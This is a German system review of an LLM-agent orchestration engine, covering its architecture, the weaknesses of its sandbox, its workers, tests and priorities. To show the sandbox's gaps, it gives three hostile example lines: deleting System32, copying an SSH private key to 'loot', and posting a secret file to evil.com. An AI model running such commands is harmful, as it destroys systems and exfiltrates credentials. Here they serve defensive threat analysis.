# Firma — Systemreview & Ausblick

> Zusammenfassung einer umfassenden Bestandsaufnahme von Kernel, Sandbox, Workern,
> Messaging, Tests und Start-Mechanismus.  
> Datum: 2026-07-23  
> Fokus: Was haben wir? Was fehlt? Was ist die Priorität?

---

## Inhaltsverzeichnis

1. [Kernel / Engine](#1-kernel--engine)
2. [Sandbox & Security](#2-sandbox--security)
3. [Worker & Agenten](#3-worker--agenten)
4. [Tests](#4-tests)
5. [Messaging & Transport](#5-messaging--transport)
6. [Prompts](#6-prompts)
7. [Start & Lifecycle](#7-start--lifecycle)
8. [Fazit & Prioritäten](#8-fazit--prioritäten)

---

## 1. Kernel / Engine

### Was es ist

Der Begriff **Kernel** bezeichnet in Firma kein einzelnes Modul `kernel.py`, sondern das **souveräne, zentrale Herzstück** der Engine — die deterministische Ausführungsmaschine. Er ist der *single-writer* und *single-source-of-truth* für den gesamten Run-State.

### Kernverantwortlichkeiten

- **State-Sovereignty (Invariante 1):** Kein Agent/Worker darf den Zustand direkt mutieren. Alle Mutations-Intents laufen durch den Kernel.
- **Tick-Loop / Orchestrierung:** Herzschlag (~500ms). Koordiniert Lifecycle-Guard, Worker-Timeouts, Verification-Phase, Scheduler, Transport-Poll und Guardian-Intake.
- **9-Step Guardian-Pipeline:** Jede Worker-Response wird determiniert geprüft (Transport → Schema → Idempotenz → Concurrency → Role-Auth → FSM → Atomic Commit).
- **GovernanceMatrix (FSM):** Hart kodierte Phasen-Transitionen (PLANNING → CODING → VERIFYING → REVIEWING → COMPLETE). Keine Magie.
- **Spec Gate:** Plausibilitätsprüfung vor Plan-Annahme (Duplikate, Zyklen, ungültige Rollen).
- **Artifact Store:** SHA256-gesicherte, versionierte Ablage. Beim Ingest erzeugt der Kernel ein Baseline-Manifest.
- **Security Boundary:** Agenten mutieren niemals die Source-of-Truth. Push-only-Kontext.

### Bewertung

| Kriterium | Bewertung |
|---|---|
| Architektur | ⭐⭐⭐⭐⭐ |
| Determinismus | ⭐⭐⭐⭐⭐ |
| Governancetransparenz | ⭐⭐⭐⭐⭐ |
| Production-Reife | ⭐⭐⭐☆☆ |

**Stärke:** Die Engine ist das beste Stück des Systems. Die Konzepte (CAS, FSM, Guardian, Sovereignty) sind extrem sauber umgesetzt.

**Luft nach oben:** Bessere Observability (Metrics, Tracing), Performance-Regressionstests.

---

## 2. Sandbox & Security

### Was wir haben

- **`LocalPythonSandbox`** in `engine/services/sandbox.py`
- Ausführung via `asyncio.create_subprocess_exec` in einem `tempfile.TemporaryDirectory`
- Path-Traversal-Schutz vor dem Schreiben
- Post-Execution-Security-Check: Snapshot-Diff des **Parent-Verzeichnisses** auf neue Dateien außerhalb des Workspace
- Timeout via `asyncio.wait_for`, Default 5.0s

### Was die Sandbox **wirklich** tut

| Schutz | Status |
|---|---|
| Datei-Isolation (Workspace) | ✅ Funktioniert |
| Path-Traversal-Schutz | ✅ Funktioniert |
| Post-Exec Leak-Check (neue Dateien im Parent) | ✅ Funktioniert |
| Prozess-Isolation (Namespace, Rechte) | ❌ Fehlt komplett |
| Netzwerk-Stopp | ❌ Fehlt komplett |
| Read-only Mounts außerhalb Workspace | ❌ Fehlt komplett |

### Das Kernproblem

Die Sandbox ist ein **"Verhaltenstest-Raum", kein "Sicherheitsgefängnis"**. Der Worker-Code läuft als echter Prozess auf deinem PC mit **deinen Rechten**.

Konkrete Risiken, die **nicht** auffliegen:
- `os.system("rmdir /S /Q C:\\Windows\\System32")` → Delete erzeugt keine neue Datei → kein Leak-Alarm
- `shutil.copy("C:\\Users\\arthu\\.ssh\\id_rsa", "./loot")` → Datei liegt im Workspace → kein Leak-Alarm, Daten sind trotzdem weg
- `requests.post("https://evil.com", data=open("secret").read())` → Kein Netzwerk-Block

### Empfehlung

Für vertrauenswürdige Worker (deine eigenen, von der Engine gesteuerten) ist die aktuelle Sandbox okay.  
Für **fremden/unkontrollierten Code** brauchst du eine **Docker-Sandbox** oder VM:

- **Docker** (empfohlen): Container mit `--network none`, read-only Host-Mounts, Resource-Limits. Das `SandboxExecutor`-Interface ist schon da — es braucht nur eine zweite Implementierung.
- **Stufe 1 (kostenlos)**: Separater, eingeschränkter Windows-User (`runas`) + Firma läuft unter diesem Account. Besser als nichts, aber kein echtes Gefängnis.

**Priorität:** HOCH — sobald du mit echten LLM-Workern arbeitest, die Code ausführen, ist das das größte Sicherheitsloch.

---

## 3. Worker & Agenten

### Grundmodell

Die Worker sind **keine denkenden Agenten, sondern gebundene Werkzeuge** des Kerns.

| Worker | Intelligenz | Bindung | Implementierung | Nutzen |
|---|---|---|---|---|
| **DummyWorker** | Null | Sehr eng | ✅ Fertig | Nur für Tests |
| **MockLLMProvider** | Simuliert | Sehr eng | ✅ Fertig | Test-Double |
| **CoderAgent** | LLM | Sehr eng (Prompt + Guardian) | ✅ Fertig | Herzstück |
| **PiProvider** | Spawn | Sehr eng (subprocess) | ✅ Fertig | Compute-Substrat |
| **FlightWorker** | Brücke | Sehr eng | ✅ Fertig | Flight Program |
| **Researcher** | LLM | Stark | 🔄 MVP/Stub | Gut für Scope, Citations erzwingen |
| **Auditor** | Keine (deterministisch) | Post-run | ✅ Fertig | Exzellent, kein LLM |
| **Reviewer** | LLM | Stark | ✅ Optimiert | Single-Pass-Validator |
| **Verifier (Rolle)** | Keine (deterministisch) | Engine-seitig | ✅ Fertig | Richtig so |
| **Planner** | LLM | Stark | 🔄 MVP | Funktioniert, Plan-Qualität kritisch |

### Wichtigste Erkenntnis

**Engine-seitige Komponenten** (Auditor, Verifier, ScopeVerifier, Guardian) sind exzellent — deterministisch, getestet, ohne LLM-Abhängigkeit.  
**Worker-seitige Komponenten** (Researcher, Planner, Coder, Reviewer) sind LLM-abhängig und damit unsicherer, aber architektonisch richtig eingebunden.

---

#### 3.1 Researcher (Phase 3, Idee B)

**Was er ist:** Read-Only-Explorer, läuft VOR dem Planner.  
**Wie er funktioniert:**
- Eigene Phase: `RESEARCHING` mit Event `RESEARCH_COMPLETE`
- Ingest-Mode: Projekt read-only unter `.pi/work/<run_id>/<task_id>/project/`
- Schreibt `research/brief.md` mit **pflichtigen Citations** (`file:`, `line:`, `evidence:`)
- ScopeVerifier prüft, dass er KEINE Projektdateien verändert hat

**Bewertung:**
- ✅ Idee ist stark (zwingt LLM zu Grounding)
- ✅ Prompt ist exzellent (Citation Guards, Read-only-HART)
- ❌ Keine echte `ResearcherAgent`-Implementierung (kein `pi_workers/researcher_agent.py`)
- ❌ Citations werden **nicht technisch verifiziert** — LLM könnte sie erfinden

**Luft nach oben:** Echten `ResearcherAgent` bauen + `CitationVerifier` der prüft: "Steht `file: X, line: Y` wirklich in Datei X?"

---

#### 3.2 Auditor (RunAuditor, Phase 4, Idee C)

**Was er ist:** Post-run, read-only Analyse-Tool. Kein Worker, sondern deterministischer Reporter.

**Wie er funktioniert:**
- Liest `manifest.json` + `db_snapshot.json` aus dem Archive
- Erstellt `audit.md` + `audit.json`
- **LLM-FREE**, **READ-ONLY**, deterministische Heuristik über `TaskTransitionLog`
- Unknown-Fälle werden explizit als "unknown" markiert — **erfindet nichts**

**Bewertung:**
- ✅ Exzellent designed
- ✅ Sehr praktisch für Debugging und Compliance
- ✅ Keine Magie, nur hard numbers
- ✅ Tool-Usage-Tracking integriert (seit 2026-07-23)

**Luft nach oben:** Fast keine. Vielleicht mehr Sections (z.B. Latenz-Histogramme).

---

#### 3.3 Reviewer

**Was er ist:** LLM-basierter Qualitätsprüfer. Soll Code gegen Original-Anforderungen prüfen.

**Bewertung (Stand 2026-07-23):**
- ✅ **Nicht mehr das schwächste Glied** — massiv optimiert
- ✅ ONE-PASS-Validator: Keine Iteration, keine Code-Änderungen
- ✅ Tool-Restriktion: Nur `read, write` (kein `bash`, kein `edit`)
- ✅ Selektives Artifact-Loading basierend auf `expected_artifacts` statt „alle laden“
- ✅ Kernel-seitige Reparatur von Timestamp-Schema-Bugs
- ✅ Metriken belegen: **1.519 → 4 Turns**, **1,23M → 152k Tokens** (task-1)

**Was bleibt kritisch:**
- ❌ Keine deterministische Review-Logik — LLM entscheidet subjektiv
- ❌ Keine Integration mit Verifier-Ergebnissen
- ❌ Keine Retry-Scrub-Logik für Reviewer-Feedback
- ❌ Redundant zum Verifier, aber unsicherer

**Luft nach oben:** Entweder durch deterministische Checks ersetzen (AST, Complexity, Linter) oder den Prompt massiv härten mit konkreten Checklisten und "FAIL bei X/Y/Z"-Regeln.

---

#### 3.4 Verifier (Rolle aus `agents/verifier.md`)

**Wichtig:** Es gibt **zwei verschiedene "Verifier"-Dinge**:
1. `agents/verifier.md` — Persona-Beschreibung für einen VERIFIER-Worker (aktuell **nicht implementiert**)
2. `engine/services/verifiers/*` + `ExecutionService` — die **tatsächliche, deterministische Verifikation** (Engine-seitig)

**Bewertung:**
- ✅ Die Engine-seitigen Verifier sind stark (CSV, Scope, WebStructural)
- ✅ Verifikation wird von der Engine gemacht, nicht von einem Worker — das ist **richtig so**
- ❌ Die Worker-Persona "Verifier" ist überflüssig dokumentiert und verwirrend

---

#### 3.5 Planner

**Was er ist:** Zerlegt High-Level-Request in Tasks mit Dependencies, Expected Artifacts und Acceptance Criteria.

**Bewertung:**
- ✅ Plan-Struktur ist klar
- ✅ SpecGate prüft Pläne vor Annahme (Duplikate, Zyklen, ungültige Rollen)
- ❌ Keine Plan-Qualitäts-Validierung im Runtime (Task-Größe, Testbarkeit)
- ❌ **Planner hat keinen Zugriff auf Research-Brief des Researchers — plant blind** → siehe [§3.5.1](#351-planner--research-brief)
- ❌ Task-Größen-Limit im SpecGate fehlt

##### 3.5.1 Planner + Research-Brief

**Das Problem:**

Der Planner erhält aktuell **nur den ursprünglichen Request/Goal**. Wenn ein `RESEARCHER` vorher Recherche betreibt (z. B. Projektstruktur analysieren, existierende Dateien scannen, Abhängigkeiten finden), werden diese Ergebnisse **nicht an den Planner weitergegeben**.

**Konsequenz:**
- Der Planner erstellt Tasks „blind“
- Er weiß nicht, welche Dateien bereits existieren
- Er plant keine sequentiellen Abhängigkeiten auf Basis echter Projektstruktur
- Tasks werden redundant oder überschneiden sich

**Beispiel:**
```
User-Request: "Bau mir ein Snake-Spiel"

1. RESEARCHER scannt Projekt → findet keine Game-Logik
                         → schreibt research/brief.md mit korrekten Pfaden

2. PLANNER bekommt NUR "Bau mir ein Snake-Spiel"
                         → weiß nichts vom Research-Brief
                         → plant Tasks möglicherweise mit falschen Annahmen
```

**Lösung:**
- Research-Brief als Teil des Planner-Prompts injizieren
- Oder: Planner erhält `research/brief.md` als Input-Context
- Task-Größen-Limit im SpecGate erzwingen

**Priorität:** HOCH — schlechte Pläne führen zu schlechten Runs.

---

## 4. Tests

### Was wir haben

- **~50 Testdateien**, ~7000 Zeilen Testcode
- Test-Pyramide: Unit, Integration, E2E, Chaos, Contract, Security
- Abdeckung: Guardian, FSM, CAS, Concurrency, Scope, Baseline, Sandbox, Transport, Worker-Binding
- **Echte E2E-Runs mit LLM erfolgreich** (siehe Meilenstein `reviewer_optimization_and_backup_2026-07-23`)

### Bewertung

| Kriterium | Bewertung |
|---|---|
| Abdeckung kritischer Pfade | ⭐⭐⭐⭐⭐ |
| Chaos/Stress-Testing | ⭐⭐⭐⭐⭐ |
| Test-Diversität | ⭐⭐⭐⭐⭐ |
| Pytest-Integration | ⭐⭐☆☆☆ |
| Performance-Regression | ⭐☆☆☆☆ |

**Ist das übertrieben?** — **Nein.** Für ein deterministisches System mit harten Garantien sind Tests die primäre Währung von Vertrauen. Die Tests sind **nicht übertrieben, sondern sogar noch zu wenig** in Bereichen, die für Produktion kritisch sind.

### Wo Luft nach oben ist

1. **Keine Performance-Regressionstests** — 500ms-Tick-Loop darf nicht durch Code-Änderung explodieren
2. **Keine Docker-Sandbox-Tests** — sobald Container-Isolation da ist, brauchst du Tests dafür
3. **Keine Langzeit-Stabilitätstests** — was passiert bei 1000+ Ticks? Memory-Leaks?
4. **Keine Pytest-Integration / CI** — Tests sind Standalone-Skripte, keine fixtures, kein CI-Runner

**Priorität:** MITTEL — die Unit/Integration/Chaos-Tests sind exzellent, aber für Produktion brauchst du Performance + CI.

---

## 5. Messaging & Transport

### Architektur

Es ist kein P2P-Chaos, sondern ein **zentrales Channel-System** mit klarer Rollen-Trennung:

```
Kernel (Engine)                     Workers
     │                                   │
     │  tasks.PLANNER    ──────────────► PLANNER
     │  tasks.CODER      ──────────────► CODER
     │  tasks.REVIEWER   ──────────────► REVIEWER
     │  tasks.RESEARCHER ──────────────► RESEARCHER
     │                                   │
     │  ◄──────────────── kernel.responses  (alle Worker)
     │                                   │
```

**Kernel → Worker:** `tasks.<ROLE>` Subjects (NATS JetStream)  
**Worker → Kernel:** `kernel.responses` Stream (ein gemeinsamer Response-Channel)

### Transport-Abstraktionen

| Transport | Zweck | Technologie |
|---|---|---|
| `LocalTransport` | Tests, einfachste Integration | In-Memory Queue |
| `ChaosTransport` | Chaos-Testing (Drops, Duplikate, Reordering, Zombies) | Wraps LocalTransport |
| `InternalTransport` | Benchmarks, High-Perf | asyncio.Queue |
| `PiMeshTransport` | File-based Bridge für pi-messenger Crew-Worker | Task-Files auf Disk |
| `PiMessengerTransport` | Echte P2P-Messaging mit NATS | NATS JetStream |

Die Engine ist **transport-agnostic** — sie kennt nur das `WorkerTransport`-Interface. Exzellentes Design.

### PiMeshTransport (der komplexe, aber clevere Fall)

**Engine → Worker:**
- Schreibt **Task-Files auf Disk**: `<crew-cwd>/.pi/messenger/crew/tasks/task-N.json` + `task-N.md`
- Atomares Schreiben (temp + rename)
- Worker-Prozesse werden durch `PiProvider` **separat gestartet** (`subprocess.Popen` mit `pi --mode json`)

**Worker → Engine:**
- Worker schreiben `worker_response.<task_id>.response.json` in `.pi/messenger/crew/`
- `PiMeshReceiverLoop` pollt die Datei, validiert Schema, inlinet Inhalte und pusht in interne Queue

### Bewertung

| Kriterium | Bewertung |
|---|---|
| Security (Kernel-State-Sovereignty) | ⭐⭐⭐⭐⭐ |
| Transport-Abstraktion | ⭐⭐⭐⭐⭐ |
| PiMesh-Komplexität | ⭐⭐⭐☆☆ |
| Dokumentation | ⭐⭐⭐⭐☆ |

**Stärke:** Kein Worker kann einen anderen Worker direkt kontaktieren. Alle Kommunikation läuft über den Kernel. Die Invariante "Push-only" bleibt gewahrt.

**Luft nach oben:**
- `ROLE_TO_CREW` mappt `RESEARCHER` auf `planning-crew` (gleicher Ordner wie Planner) — potenzieller Konflikt
- Kein Backpressure/Flow-Control — Kernel dispatcht so schnell er kann
- `run_pi_mesh.py` als eigenständiger Entry-Point ohne Worker-Spawn ist ein bekanntes Fallstrick

---

## 6. Prompts

### Grundmodell

Die Prompts werden **dynamisch in `_build_spec_markdown()`** generiert (`engine/transport/pi_mesh_transport.py`). Sie sind rollenspezifisch und sehr detailliert.

### Bewertung pro Rolle

#### PLANNER
- ✅ Hartes JSON-Schema, kein Code-Schreiben erlaubt
- ❌ Kein Zugriff auf Research-Brief — plant blind → siehe [§3.5.1](#351-planner--research-brief)

#### CODER
- ✅ Klare Scope-Begrenzung ("ausschließlich diese Task")
- ✅ Ingest-Mode mit read-only Reference + Write-Pfad
- ✅ Previous Feedback als Override (Retry-Scrub)
- ✅ Exakter Output-Contract
- ❌ Akzeptanzkriterien werden 1:1 weitergegeben — wenn sie schlecht formuliert sind, versucht es der Coder trotzdem

#### RESEARCHER
- ✅ **Bester Prompt des Systems** — Citation Guards erzwingen Grounding
- ✅ Response-First (zuerst antworten, dann arbeiten)
- ✅ strikte Read-only-Regel
- ❌ Citations werden **nicht technisch verifiziert** — LLM könnte sie erfinden

#### REVIEWER
- ✅ ** massiv optimiert** — ONE-PASS-Validator, Tool-Restriktion auf `read, write`
- ❌ Keine Checkliste, kein Scoring, kein Bezug zu Verifier-Ergebnissen
- ❌ Keine Retry-Scrub-Logik für Reviewer-Feedback
- ❌ Redundant zum Verifier, aber unsicherer

### Bewertung

| Rolle | Prompt-Qualität | Sicherheit | Status |
|---|---|---|---|
| CODER | ⭐⭐⭐⭐☆ | ⭐⭐⭐☆☆ | Stabil |
| RESEARCHER | ⭐⭐⭐⭐⭐ | ⭐⭐⭐☆☆ | Gut, Citations unverifiziert |
| PLANNER | ⭐⭐⭐☆☆ | ⭐⭐⭐⭐☆ | Kritisch: Research-Brief fehlt |
| REVIEWER | ⭐⭐⭐⭐☆ | ⭐⭐⭐⭐☆ | Stabil, optimiert |

**Priorität:** **Planner** Research-Brief injizieren. Dann **CitationVerifier** für Researcher bauen.

---

## 7. Start & Lifecycle

### Was wir haben

- **Kein Startknopf / keine GUI** — Start erfolgt über Kommandozeile mit ENV-Variablen
- **Haupt-Einstieg:** `run_snake.py` — wählt Transport + App über ENV, baut DB, startet Orchestrator
- **Lifecycle:** `RunController` (`create_run` → `start_run` → `stop_run` / `cancel_run`)

### Entry-Points

| Datei | Rolle | Status |
|---|---|---|
| `run_snake.py` | Haupt-Einstieg für alle produktiven Läufe | ✅ |
| `run_pi_mesh.py` | Hilfsmodul für PiMeshTransport + ReceiverLoop | ⚠️ Häuft Fallstricke |
| `platform/main.py` | Eigenständiger Platform-Start | 🔄 Experimentell |

### Der große Fallstrick

**`run_pi_mesh.py` allein starten** funktioniert scheinbar, aber:
- Tasks werden dispatched (Task-Files werden geschrieben)
- **ES LÄUFT KEIN WORKER** → Tasks timeouten → Run terminiert nie sauber

Die Doku (`docs/guides/Startup.md`) warnt explizit davor — aber es gibt **keine technische Hürde**, die das verhindert.

### ENV-Steuerung

Sehr mächtig und flexibel:

| Variable | Zweck |
|---|---|
| `FIRMA_TRANSPORT` | `in-process` vs `pimesh` |
| `FIRMA_APP` | `snake` vs `counter` |
| `FIRMA_REVIEWER_DUMMY` | echter LLM-Reviewer vs deterministischer Bypass |
| `FIRMA_SESSION_MODE` | `off` vs `task` vs `persona_base` |
| `FIRMA_MAX_CONCURRENT_SPAWNS` | Rate-Limit-Schutz für Free-Tier |
| `FIRMA_MODEL_*` | Optional: Modell für PLANNER/CODER/REVIEWER erzwingen |
| `FIRMA_RESEARCH_WEB` | Researcher-Web-Recherche aktivieren |

### Bewertung

| Kriterium | Bewertung |
|---|---|
| Architektur (RunController + ENV) | ⭐⭐⭐⭐⭐ |
| Benutzerfreundlichkeit | ⭐⭐☆☆☆ |
| Dokumentation | ⭐⭐⭐⭐☆ |
| Error Handling / Fallstricke | ⭐⭐☆☆☆ |

**Was fehlt:**
1. **Ein einziger, kanonischer Entry-Point** (`firma run` oder `python -m firma run`)
2. **CLI-Interface** (`firma status/stop/logs/resume`)
3. **Graceful Shutdown + Save-State** (kein Resume nach Abbruch)
4. **Konfigurierbare Timeouts** (keine hartkodierten 20 Minuten)
5. **Automatische Aufräumung** (alte `pi`-Worker, DB-Locks, `.pi/`-Artefakte)

**Priorität:** MITTEL — funktioniert für Development, aber für Produktion und neue Nutzer undurchsichtig.

---

## 8. Fazit & Prioritäten

### Gesamteindruck

Firma ist eine **exzellent gebaute deterministische Engine-Infrastruktur**, die genau das tut, was sie soll: Infrastruktur-Kontrolle über LLM-Artefakte. Die Kernkonzepte (Sovereignty, Guardian, FSM, CAS) sind **bemerkenswert sauber** umgesetzt.

Das System ist aktuell ein **MVP/Prototyp auf sehr hohem Niveau** — keine fertige Produktion, aber die Architektur ist solide genug, um darauf aufzubauen.

### Was neu hinzugekommen ist (seit 2026-07-19)

- ✅ **Reviewer-Optimierung abgeschlossen:** 4 Turns, 152k Tokens, Tool-Policies, ONE-PASS-Vertrag
- ✅ **GitHub-Backup:** Sauberer Branch `clean-backup-2` ohne historische Secrets
- ✅ **Meilenstein dokumentiert:** `milestones/reviewer_optimization_and_backup_2026-07-23`
- ✅ **Docs-Struktur:** Neu geordnet in `decisions/`, `guides/`, `plans/`, `vision/`, `meta/`, `briefings/`
- ✅ **Phase-4-Auditor erweitert:** Tool-Usage-Tracking + Policy-Checks

### Priorisierte To-Dos

| Priorität | Thema | Maßnahme | Aufwand |
|---|---|---|---|
| 🔴 **HOCH** | Sandbox-Sicherheit | Docker-Sandbox als zweite `SandboxExecutor`-Implementierung (`--network none`, read-only Mounts) | Mittel |
| 🔴 **HOCH** | Planner + Research | Planner bekommt Research-Brief; Task-Größen-Limit im SpecGate | Mittel |
| 🟡 **MITTEL** | Resume/Rollback | Save-State + `firma resume <run_id>` | Hoch |
| 🟡 **MITTEL** | Start/UX | Einziger Entry-Point + CLI (`firma run/status/stop/logs`) | Hoch |
| 🟡 **MITTEL** | Performance-Tests | Automatisierte Latenz-Regressionstests für Tick-Loop | Mittel |
| 🟢 **NIEDRIG** | Docker-Sandbox-Tests | Tests für Container-Isolation, falls Docker da ist | Mittel |
| 🟢 **NIEDRIG** | Langzeit-Stabilität | 1000+ Tick-Run ohne Memory-Leak | Niedrig |
| 🟢 **NIEDRIG** | Pytest/CI | Tests in pytest integrieren, CI-Runner | Mittel |

### Was richtig gut läuft

- ✅ Kernel-State-Sovereignty + Guardian-Pipeline
- ✅ GovernanceMatrix (FSM) + CAS + Optimistic Concurrency
- ✅ Scope/Protected-Verifier (Phase 2) + Baseline-Manifest
- ✅ Auditor (Phase 4) — LLM-free, deterministisch, nützlich
- ✅ Transport-Abstraktion (Engine unabhängig von NATS/Disk/Queue)
- ✅ Chaos/Stress/Evil-Worker-Tests
- ✅ Reviewer-Tool-Restriktion + ONE-PASS-Vertrag
- ✅ Tool-Policies als Architektur-Invariante dokumentiert
- ✅ Doku (`docs/guides/Startup.md`, `docs/vision/Verständnis.md`)

### Was am dringendsten repariert werden muss

1. **Sandbox ist kein Gefängnis** — Worker-Code läuft mit deinen Rechten. Docker/VM-Isolation ist Pflicht, sobald du mit echten LLMs arbeitest.
2. **Planner plant blind** — ohne Research-Brief fehlt ihm Kontext, was zu schlechten Plänen führt.
3. **Kein Resume** — wenn ein Run abbricht, ist er weg. Kein Save-State, kein Continue.
4. **Kein kanonischer Entry-Point** — Nutzer müssen wissen, welche Datei sie starten müssen.

### Was die Firma richtig gemacht hat

- **Determinismus durch Infrastruktur, nicht durch das LLM.** LLMs treffen keine Statusentscheidungen — das tut der Kernel.
- **Trust-Zero:** Keine Nachricht wird ohne Guardian-Validierung verarbeitet.
- **Fail-Fast:** Sobald eine Regel verletzt wird, bricht das System ab.
- **Push-only:** Kontext wird vom Kernel an Worker gepusht, nicht vom Worker gezogen.
- **Tool-Policies nach Rolle** — Reviewer kriegt nur `read, write`, Coder kriegt `edit`, Researcher kein `bash` ohne Freigabe.

---

## Anhang: Wichtige Dateien zum Nachschlagen

| Thema | Datei |
|---|---|
| Start-Anleitung | `docs/guides/Startup.md` |
| Verständnis Architektur | `docs/vision/Verständnis.md` |
| Vision & Invarianten | `docs/vision/Vision_Inkrementell_Researcher_Auditor.md` |
| Tool-Policies | `docs/vision/PiMesh_Architektur.md §9.1` |
| Orchestrator (Tick-Loop) | `engine/orchestrator.py` |
| Guardian (9-Step) | `engine/services/guardian.py` |
| Governance (FSM) | `engine/governance.py` |
| Sandbox | `engine/services/sandbox.py` |
| PiMeshTransport | `engine/transport/pi_mesh_transport.py` |
| PiProvider (Spawn) | `engine/providers/pi_provider.py` |
| Receiver Loop | `run_pi_mesh.py` |
| RunController (Lifecycle) | `engine/controller.py` |
| Auditor | `engine/services/auditor.py` |
| ScopeVerifier | `engine/services/verifiers/scope_verifier.py` |
| Prompts (generiert) | `engine/transport/pi_mesh_transport.py::_build_spec_markdown()` |
